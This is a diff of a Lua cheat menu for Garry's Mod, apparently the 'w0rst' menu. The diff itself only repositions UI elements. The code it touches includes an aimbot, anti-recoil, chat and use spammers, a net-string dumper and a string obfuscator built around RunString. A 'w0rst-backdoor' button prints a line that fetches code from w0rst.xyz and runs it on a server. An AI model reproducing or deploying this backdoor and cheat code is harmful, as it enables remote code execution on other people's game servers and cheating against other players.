@@ -1750,7 +1750,7 @@ CreateButton("Run Lua", BackdoorTab[1], 115, 30, 379, 520, function()
     end
 end)
 
-CreateCheckbox("Adv-Bhop", MiscTab[1], 20, 10, function()
+CreateCheckbox("Adv-Bhop", MiscTab[1], 22, 10, function()
     enable['Bhop'] = not enable['Bhop']
     if enable['Bhop'] then
         wtf.Log("Bhop Enabled")
@@ -1761,7 +1761,7 @@ CreateCheckbox("Adv-Bhop", MiscTab[1], 20, 10, function()
     end
 end)
 
-CreateButton("Net-Dumper", MiscTab[1], 110, 25, 140, 10, function()
+CreateButton("Net-Dumper", MiscTab[1], 110, 25, 142, 10, function()
     local name = "w0rst/netstrings".."_"..math.random(10^5,10^10)..".txt"
     if file.Exists(name, "DATA") then
         file.Delete(name)
@@ -1781,12 +1781,12 @@ CreateButton("Net-Dumper", MiscTab[1], 110, 25, 140, 10, function()
     wtf.conoutRGB("NET DUMP LOCATION: GarrysMod\\garrysmod\\data\\"..name)
 end)
 
-CreateButton("w0rst-backdoor", MiscTab[1], 110, 25, 260, 10, function()
+CreateButton("w0rst-backdoor", MiscTab[1], 110, 25, 262, 10, function()
     MsgC("timer.Simple(5, function() http.Fetch('https://w0rst.xyz/script/napalm', RunString) end)\n")
     wtf.Log("Check Console")
 end)
 
-CreateButton("Rainbow-Physgun", MiscTab[1], 110, 25, 380, 10, function()
+CreateButton("Rainbow-Physgun", MiscTab[1], 110, 25, 382, 10, function()
     enable['PhysRainbow'] = not enable['PhysRainbow']
     if enable['PhysRainbow'] then
         wtf.Log("RGB-Physgun Enabled")
@@ -1795,7 +1795,7 @@ CreateButton("Rainbow-Physgun", MiscTab[1], 110, 25, 380, 10, function()
     end
 end)
 
-CreateCheckbox("Use-Spammer", MiscTab[1], 20, 40, function()
+CreateCheckbox("Use-Spammer", MiscTab[1], 22, 40, function()
     enable['UseSpam'] = not enable['UseSpam']
     if enable['UseSpam'] then
         wtf.Log("Use Spammer Enabled")
@@ -1809,7 +1809,7 @@ CreateCheckbox("Use-Spammer", MiscTab[1], 20, 40, function()
     end
 end)
 
-CreateCheckbox("Flash-Spammer", MiscTab[1], 140, 40, function()
+CreateCheckbox("Flash-Spammer", MiscTab[1], 142, 40, function()
     enable['FlashSpam'] = not enable['FlashSpam']
     if enable['FlashSpam'] then
         wtf.Log("Flash Spammer Enabled")
@@ -1822,14 +1822,14 @@ CreateCheckbox("Flash-Spammer", MiscTab[1], 140, 40, function()
     end
 end)
 
-CreateButton("FOV-Editor", MiscTab[1], 110, 25, 260, 40, function()
+CreateButton("FOV-Editor", MiscTab[1], 110, 25, 262, 40, function()
     Derma_StringRequest("Edit Fov", "Set Fov To:", "", function(str)
         LocalPlayer():ConCommand("fov_desired "..str)
         wtf.Log("FOV Set: "..str)
     end)
 end)
 
-CreateButton("Encode-String", MiscTab[1], 110, 25, 380, 40, function()
+CreateButton("Encode-String", MiscTab[1], 110, 25, 382, 40, function()
     Derma_StringRequest("Encode String", "String To Encode", "", function(str)
         local encoded = str:gsub(".", function(bb) return "\\" .. bb:byte() end)
         wtf.conoutRGB("ENCODED-STRING: ".."RunString('"..encoded.."')")
@@ -1838,7 +1838,7 @@ CreateButton("Encode-String", MiscTab[1], 110, 25, 380, 40, function()
       end)
 end)
 
-CreateCheckbox("Chat Advertise", MiscTab[1], 20, 70, function()
+CreateCheckbox("Chat Advertise", MiscTab[1], 22, 70, function()
     enable['ChatSpam'] = not enable['ChatSpam']
     if enable['ChatSpam'] then
         wtf.Log("Chat Advertiser Enabled")
@@ -1847,8 +1847,7 @@ CreateCheckbox("Chat Advertise", MiscTab[1], 20, 70, function()
     end
 end)
 
-CreateSlider("Fov:", FovCircle, MiscTab[1], 960, 25, 260, 70)
-CreateCheckbox("Fov Aimbot", MiscTab[1], 140, 70, function()
+CreateCheckbox("Fov Aimbot", MiscTab[1], 142, 70, function()
     enable['Aimbot'] = not enable['Aimbot']
     if enable['Aimbot'] then
         wtf.Log("Aimbot Enabled")
@@ -1857,21 +1856,23 @@ CreateCheckbox("Fov Aimbot", MiscTab[1], 140, 70, function()
     end
 end)
 
-CreateCheckbox("Auto Fire", MiscTab[1], 20, 100, function()
-    enable['AutoFire'] = not enable['AutoFire']
-    if enable['AutoFire'] then
-        wtf.Log("Aimbot AutoFire Enabled")
-    else
-        wtf.Log("Aimbot AutoFire Disabled")
-    end
-end)
+CreateSlider("Fov:", FovCircle, MiscTab[1], 960, 25, 262, 70)
 
-CreateCheckbox("AntiRecoil", MiscTab[1], 380, 70, function()
+CreateCheckbox("AntiRecoil", MiscTab[1], 382, 70, function()
     enable['AntiRecoil'] = not enable['AntiRecoil']
     if enable['AntiRecoil'] then
         wtf.Log("AntiRecoil Enabled")
     else
         wtf.Log("AntiRecoil Disabled")
+    end
+end)
+
+CreateCheckbox("Auto Fire", MiscTab[1], 22, 100, function()
+    enable['AutoFire'] = not enable['AutoFire']
+    if enable['AutoFire'] then
+        wtf.Log("Aimbot AutoFire Enabled")
+    else
+        wtf.Log("Aimbot AutoFire Disabled")
     end
 end)
 
